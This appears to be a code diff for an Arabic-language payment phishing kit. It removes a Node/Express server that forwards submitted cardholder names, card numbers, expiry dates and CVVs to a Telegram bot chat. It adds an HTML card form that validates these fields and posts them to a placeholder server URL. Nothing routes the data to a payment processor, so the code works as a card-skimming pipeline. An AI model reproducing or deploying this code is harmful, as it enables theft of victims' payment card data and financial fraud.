@@ -1,39 +1,122 @@
-const express = require("express");
-const cors = require("cors");
-const axios = require("axios");
-require("dotenv").config();
-
-const app = express();
-app.use(express.json());
-app.use(cors());
-
-// بيانات البوت من متغيرات البيئة
-const BOT_TOKEN = process.env.BOT_TOKEN;
-const CHAT_ID = process.env.CHAT_ID;
-
-// استقبال البيانات من HTML وإرسالها إلى تيليجرام
-app.post("/send", async (req, res) => {
-    try {
-        const { cardHolder, cardNumber, expiryDate, cvv, saveCard } = req.body;
-
-        if (!cardHolder || !cardNumber || !expiryDate || !cvv) {
-            return res.status(400).json({ message: "يجب ملء جميع الحقول!" });
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نموذج الدفع</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            direction: rtl;
         }
+        form {
+            display: inline-block;
+            text-align: right;
+            padding: 20px;
+            border: 1px solid #ccc;
+            border-radius: 10px;
+            background: #f9f9f9;
+        }
+        input {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .error {
+            border-color: red;
+        }
+        button {
+            background: blue;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
 
-        const text = `🚀 بيانات جديدة:\n\n👤 الاسم: ${cardHolder}\n💳 رقم البطاقة: ${cardNumber}\n📅 تاريخ الانتهاء: ${expiryDate}\n🔒 CVV: ${cvv}\n💾 حفظ البطاقة: ${saveCard}`;
+    <h2>معلومات الدفع</h2>
+    <form id="paymentForm">
+        <label>رقم البطاقة</label>
+        <input type="text" id="cardNumber" maxlength="16" required>
 
-        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            chat_id: CHAT_ID,
-            text: text
+        <label>تاريخ الانتهاء</label>
+        <input type="text" id="expiryDate" maxlength="5" placeholder="MM/YY" required>
+
+        <label>رمز الأمان (CVV)</label>
+        <input type="text" id="cvv" maxlength="3" required>
+
+        <button type="submit">إرسال</button>
+    </form>
+
+    <script>
+        document.getElementById("expiryDate").addEventListener("input", function(e) {
+            let value = e.target.value.replace(/\D/g, ''); // إزالة أي أحرف غير أرقام
+            if (value.length >= 2) {
+                e.target.value = value.slice(0, 2) + '/' + value.slice(2, 4);
+            } else {
+                e.target.value = value;
+            }
         });
 
-        res.json({ message: "تم الإرسال بنجاح!" });
-    } catch (error) {
-        console.error("خطأ أثناء الإرسال إلى تيليجرام:", error);
-        res.status(500).json({ message: "حدث خطأ أثناء الإرسال!" });
-    }
-});
+        document.getElementById("paymentForm").addEventListener("submit", function(e) {
+            e.preventDefault();
 
-// تشغيل السيرفر
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
+            let cardNumber = document.getElementById("cardNumber");
+            let expiryDate = document.getElementById("expiryDate");
+            let cvv = document.getElementById("cvv");
+
+            let hasError = false;
+
+            if (cardNumber.value.length !== 16) {
+                cardNumber.classList.add("error");
+                hasError = true;
+            } else {
+                cardNumber.classList.remove("error");
+            }
+
+            if (!/^\d{2}\/\d{2}$/.test(expiryDate.value)) {
+                expiryDate.classList.add("error");
+                hasError = true;
+            } else {
+                expiryDate.classList.remove("error");
+            }
+
+            if (cvv.value.length !== 3) {
+                cvv.classList.add("error");
+                hasError = true;
+            } else {
+                cvv.classList.remove("error");
+            }
+
+            if (hasError) {
+                alert("يجب ملء جميع الحقول بشكل صحيح!");
+                return;
+            }
+
+            let formData = {
+                cardNumber: cardNumber.value,
+                expiryDate: expiryDate.value,
+                cvv: cvv.value
+            };
+
+            fetch("https://your-server-url.com/submit", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(formData)
+            }).then(response => response.json())
+            .then(data => alert("تم الإرسال بنجاح!"))
+            .catch(error => alert("حدث خطأ أثناء الإرسال!"));
+        });
+    </script>
+
+</body>
+</html>
